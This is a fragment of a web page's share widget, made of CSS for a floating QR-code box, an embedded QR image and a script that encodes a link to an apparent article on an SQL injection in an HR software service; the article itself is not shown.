padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 